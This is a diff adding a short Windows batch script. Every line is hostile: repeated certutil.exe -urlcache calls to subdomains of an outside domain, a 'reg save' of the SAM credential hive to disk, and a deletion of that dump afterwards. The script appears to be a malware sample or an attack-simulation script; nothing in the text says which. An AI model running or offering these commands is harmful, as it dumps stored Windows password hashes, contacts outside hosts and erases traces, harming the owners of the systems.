@@ -1,0 +1,10 @@
+@echo off
+certutil.exe -urlcache -f http://wrs21.winshipway.com
+certutil.exe -urlcache -f http://wrs21.winshipway.com
+certutil.exe -urlcache -f http://wrs31.winshipway.com
+certutil.exe -urlcache -f http://wrs41.winshipway.com
+certutil.exe -urlcache -f http://wrs21.winshipway.com
+reg.exe save hklm\sam c:\sam.save
+certutil.exe -urlcache -f http://ca91-1.winshipway.com
+certutil.exe -urlcache -f http://ca92-1.winshipway.com
+del /f c:\sam.save
